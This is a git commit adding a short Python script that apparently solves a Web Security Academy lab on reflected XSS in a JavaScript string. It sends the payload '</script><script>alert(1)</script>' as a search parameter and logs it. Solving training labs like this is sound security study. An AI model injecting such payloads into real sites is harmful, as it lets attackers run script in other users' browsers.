edfa557cfe33a69c9432c61eab431a0443f0d577
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-04-07 06:32:55 -0700

    Reflected XSS into a JavaScript string with single quote and backslash escaped

---
+++ web_security_academy/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped.py
@@ -0,0 +1,9 @@
+from web_security_academy.core.logger import logger
+
+
+def solve_lab(session):
+    xss = "</script><script>alert(1)</script>"
+
+    session.get_path("/", params={"search": xss})
+    logger.info("Searched the following payload:")
+    logger.info(xss)
